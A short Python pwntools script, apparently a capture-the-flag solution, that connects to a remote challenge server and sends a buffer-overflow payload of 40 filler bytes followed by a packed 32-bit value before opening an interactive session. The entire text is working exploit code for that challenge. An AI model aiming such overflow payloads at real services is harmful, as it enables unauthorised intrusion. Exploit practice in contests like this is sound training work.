from pwn import *

proc=remote("litctf.live",31786)

print(proc.recvline().decode())
payload=b"A"*40+p32(0xabadaaab)
proc.sendline(payload)
proc.interactive()
